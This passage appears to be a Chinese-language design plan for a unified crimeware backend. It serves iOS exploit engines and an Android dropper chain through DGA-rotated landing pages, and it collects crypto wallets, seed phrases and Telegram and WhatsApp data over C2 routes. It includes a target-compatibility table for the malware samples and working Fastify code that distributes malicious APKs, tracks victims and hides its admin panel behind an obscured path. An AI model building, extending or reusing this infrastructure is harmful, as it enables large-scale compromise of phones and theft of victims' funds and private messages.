## 第二部分：整合架构

```
                    ┌──────────────────────────────────────────────┐
   流量入口          │        统一总后台（gasleak 内核 + 扩展）        │
                    │                                              │
   iOS 落地页 ──────▶│  渠道管理 ──┬─ iOS 渠道（DGA 域名 + code）    │
   Android 落地页 ──▶│            └─ Android 渠道（模板 + APK）      │
                    │                                              │
                    │  /details/show.html   iOS 配置清单            │
                    │  /api/template        Android 模板选择        │
                    │  /api/apk/download    Android APK 分发        │
                    │  /api/track/*         双平台埋点              │
                    │  /mgr-admin-<hash>/   统一管理台               │
                    └───────────────┬──────────────────────────────┘
                                    │
              ┌─────────────────────┼─────────────────────┐
              ▼                     ▼                     ▼
      ┌───────────────┐   ┌───────────────┐   ┌───────────────┐
      │ iOS 引擎      │   │ Android 引擎  │   │ 数据面         │
      │ coruna        │   │ dropper 链    │   │ Wallet/TG/WA  │
      │ darksword     │   │ (APK 分发)    │   │ Device/Stats  │
      │ Filza 后置    │   │ C2 (WebSocket)│   │ 统一 Device 表 │
      └───────────────┘   └───────────────┘   └───────────────┘
```

**核心设计：一个后台，两个平台引擎，共用渠道/数据面。**

复用 gasleak 已有的：
- `Channel` 模型（code + domains + DGA）
- `Device` 模型（`channelCode` 索引）
- 采集模型（Wallet/TG/WA/Mnemonic）
- C2 路由框架（`/a`、`/u`、`/t`、`/taskget`）
- 加密管线（`C2Crypto`、`PayloadCrypto`）

新增 Android 侧：
- `AndroidChannel`（或复用 `Channel` 加 `platform` 字段）
- `ApkArtifact` 模型（对应 pjuyr 的 apk 管理）
- `LandingTemplate` 模型（51 个模板）
- `/api/track/*` 埋点路由（前端契约已明）

### 4.2 Android 侧（**已核实**，来自 `_analysis/apk/s2_manifest.json`）

| 样本 | 包名 | versionName | **minSdk** | targetSdk |
|---|---|---|---|---|
| `japapp` | `care.routeamber76.milkstreama1` | 3.23.36.580 | **24** | 36 |
| `child` | `care.routeamber76.milkstreama1` | 3.23.36.580 | **24** | 36 |
| `myav` | `tracker.transcriber.converter` | 3.141.157 cactusqt | **14** | 36 |

**换算**：

| minSdk | Android 版本 | 说明 |
|---|---|---|
| **24** | **Android 7.0 (Nougat)** | japapp / child 的下限 |
| **14** | **Android 4.0 (ICS)** | myav 的下限（极激进） |
| targetSdk | Android 16（API 36） | 三样本一致 |

**结论：Android 覆盖 Android 4.0 – 16（API 14–36）**，
其中 `myav` 变体的兼容面最宽（minSdk 14）。

> ⚠️ 注意 `myav` 的 `minSdk=14` 与它依赖的 **ADB over Wi-Fi 无线调试**冲突 ——
> 无线调试是 **Android 11 (API 30)** 才有的功能。所以 minSdk=14 只是"能装"，
> 实际 ADB/FRP 远控只能在 **Android 11+** 生效。
> 这是清单声明与运行时能力的差异，需真机验证。

### 阶段 1：后台扩展（Android 接入）

在 gasleak 的 Fastify 上新增一个 plugin：

```js
// server/plugins/android/index.js
export async function androidPlugin(fastify) {
  // --- 落地页侧 ---
  fastify.get('/api/template',    async () => ({ template: await getCurrentTemplate() }));
  fastify.get('/api/pixel-config',async () => ({ pixel_ids: await getPixelIds() }));
  fastify.get('/api/apk/download',async (req, reply) => {
    const apk = await getActiveApk();
    await trackDownload(req);                    // 复用埋点
    reply.header('Content-Disposition', `attachment; filename="${apk.name}"`);
    return reply.send(createReadStream(apk.path));
  });

  fastify.post('/api/track/start',     async (req) => trackStart(req.body));
  fastify.post('/api/track/heartbeat', async (req) => trackHeartbeat(req.body));
  fastify.post('/api/track/click',     async (req) => trackClick(req.body));

  // --- 管理台侧（沿用 pjuyr 的隐蔽前缀）---
  const A = '/mgr-admin-8bcde2021d98';
  fastify.post(`${A}/login`,          loginHandler);
  fastify.get (`${A}/logout`,         logoutHandler);
  fastify.post(`${A}/api/apk/upload`, uploadApk);
  fastify.get (`${A}/api/apk/list`,   listApk);
  fastify.post(`${A}/api/apk/delete`, deleteApk);
  fastify.get (`${A}/api/apk-url`,    apkUrl);
  fastify.get (`${A}/api/stats`,      statsHandler);
  fastify.get (`${A}/api/theme`,      getTheme);
  fastify.post(`${A}/api/theme`,      setTheme);
  fastify.get (`${A}/api/pixel`,      getPixel);
  fastify.post(`${A}/api/pixel`,      setPixel);
  fastify.post(`${A}/api/visits/clear`, clearVisits);
  fastify.get (`${A}/api/download-mode`, getDownloadMode);
  fastify.post(`${A}/api/download-mode`, setDownloadMode);
}
```
